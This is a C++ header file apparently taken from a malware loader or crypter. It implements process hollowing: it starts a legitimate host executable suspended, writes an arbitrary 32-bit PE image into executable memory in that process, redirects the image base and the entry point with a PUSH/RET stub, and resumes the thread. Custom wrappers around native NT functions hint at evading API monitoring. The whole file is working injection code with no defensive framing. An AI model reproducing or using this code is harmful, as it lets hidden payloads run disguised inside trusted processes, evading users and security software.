#pragma once

class ProcessHollowingHelper
{
	static bool SetHostImageBase(PPROCESS_INFORMATION inProcessInformation, PCONTEXT inProcessContext, DWORD inImageBase)
	{
		return WriteDataToHostMemory(inProcessInformation, inProcessContext->Ebx + 8, (byte*)(&inImageBase), 4);
	}

	static bool WriteDataToHostMemory(PPROCESS_INFORMATION inProcessInformation, DWORD inVirtualAddress, byte* inData, DWORD inDataLength)
	{
		bool result = false;

		DWORD oldProtectionStatus = 0;

		if (VirtualProtectEx(inProcessInformation->hProcess, LPVOID(inVirtualAddress), inDataLength, PAGE_READWRITE, &oldProtectionStatus) == TRUE)
		{
			DWORD tempWriteByte = 0;

			if (MyNtWriteVirtualMemory(inProcessInformation->hProcess, PVOID(inVirtualAddress), inData, inDataLength, &tempWriteByte) == 0)
			{
				DWORD tempProtectionStatus = 0;

				if (VirtualProtectEx(inProcessInformation->hProcess, PVOID(inVirtualAddress), inDataLength, oldProtectionStatus, &tempProtectionStatus) == TRUE)
				{
					result = true;
				}
			}
		}

		return result;
	}

	static byte* MapAssemblyFileContentToMemory(byte* inAssemblyContent, DWORD* outMappedAssemblySize)
	{
		byte* result;

		PortableExecutableParser* pe = new PortableExecutableParser(inAssemblyContent);

		*outMappedAssemblySize = pe->SizeOfImage;

		result = new byte[*outMappedAssemblySize];

		memset(result, 0, *outMappedAssemblySize);

		//
		memcpy(result, pe->PeContent, pe->NtHeader->OptionalHeader.SizeOfHeaders);

		for (DWORD index = 0; index < pe->SectionCount; index++)
		{
			memcpy(pe->GetSectionHeader(index)->VirtualAddress + result, pe->PeContent + pe->GetSectionHeader(index)->PointerToRawData, pe->GetSectionHeader(index)->SizeOfRawData);
		}

		//
		delete pe;

		return result;
	}

	static bool Inject(byte* inPeContent, PPROCESS_INFORMATION inProcessInformation, PCONTEXT inHostProcessContext, DWORD inAddressOfEntryPoint, DWORD inImageBaseOfAllocatedMemory)
	{
		bool result = false;

		DWORD mappedAssemblySize = 0;

		byte* mappedMemory = MapAssemblyFileContentToMemory(inPeContent, &mappedAssemblySize);

		if (mappedMemory != nullptr)
		{
			if (WriteDataToHostMemory(inProcessInformation, inImageBaseOfAllocatedMemory, mappedMemory, mappedAssemblySize))
			{
				if (WriteDataToHostMemory(inProcessInformation, inHostProcessContext->Ebx + 8, (byte*)(&inImageBaseOfAllocatedMemory), 4))
				{
					DWORD entryPointContentLength = 1 + 4 + 1;
					byte* entryPointContent = new byte[entryPointContentLength];

					entryPointContent[0] = 0x68; // PUSH
					*(PDWORD(entryPointContent + 1)) = inImageBaseOfAllocatedMemory + inAddressOfEntryPoint;
					entryPointContent[5] = 0xC3; // RET

					// Set Entry Point
					if (WriteDataToHostMemory(inProcessInformation, inHostProcessContext->Eax, entryPointContent, entryPointContentLength))
					{
						result = true;
					}

					delete entryPointContent;
				}
			}

			delete mappedMemory;
		}

		return result;
	}

	static bool RunProcess(byte* inPeContent, wchar_t* inHostFileAddress, HANDLE* outProcessHandle)
	{
		bool result = false;

		if (inPeContent != nullptr && inHostFileAddress != nullptr)
		{
			*outProcessHandle = nullptr;

			PortableExecutableParser* pe = new PortableExecutableParser(inPeContent);

			PROCESS_INFORMATION processInformation;
			STARTUPINFOW startupInformation;

			RtlZeroMemory(&processInformation, sizeof(processInformation));
			RtlZeroMemory(&startupInformation, sizeof(startupInformation));

			BOOL createProcessResult = CreateProcessW(inHostFileAddress, nullptr, nullptr, nullptr, FALSE, CREATE_SUSPENDED, nullptr, nullptr, &startupInformation, &processInformation);

			if (createProcessResult)
			{
				CONTEXT hostProcessContext;

				hostProcessContext.ContextFlags = CONTEXT_FULL;

				if (MyNtGetContextThread(processInformation.hThread, PCONTEXT(&hostProcessContext)) == 0)
				{
					DWORD imageBaseOfAllocatedMemory = DWORD(VirtualAllocEx(processInformation.hProcess, nullptr, pe->SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE));

					if (imageBaseOfAllocatedMemory != 0)
					{
						if (Inject(inPeContent, &processInformation, &hostProcessContext, pe->NtHeader->OptionalHeader.AddressOfEntryPoint, imageBaseOfAllocatedMemory))
						{
							result = MyNtResumeThread(processInformation.hThread, nullptr) == 0;

							if (outProcessHandle != nullptr)
							{
								*outProcessHandle = processInformation.hProcess;
							}
						}
					}
				}

				if (result == false)
				{
					TerminateProcess(processInformation.hProcess, 0);

					CloseHandle(processInformation.hProcess);
				}
			}

			delete pe;
		}

		return result;
	}

public:

	static bool IsSupported(byte* inAssemblyContent)
	{
		bool result = false;

		if (inAssemblyContent != nullptr)
		{
			PortableExecutableParser* pe = new PortableExecutableParser(inAssemblyContent);

			if (pe->HasDosSignature && pe->HasNtSignature)
			{
				result = (pe->NtHeader->FileHeader.Machine == IMAGE_FILE_MACHINE_I386);
			}

			delete pe;
		}
		return result;
	}

	static bool IsSupported(wchar_t* inHostFileAddress)
	{
		bool result = false;

		auto length = 0;

		auto fileContent = FileOperationHelper::ReadFileContent(inHostFileAddress, &length);

		if (length != 0 && fileContent != nullptr)
		{
			result = IsSupported(fileContent);

			delete fileContent;
		}

		return result;
	}

	static bool Run(byte* inPeContent, wchar_t* inHostFileAddress, HANDLE* outProcessHandle)
	{
		bool result = false;

		if (IsSupported(inHostFileAddress) && IsSupported(inPeContent))
		{
			result = RunProcess(inPeContent, inHostFileAddress, outProcessHandle);
		}

		return result;
	}
};

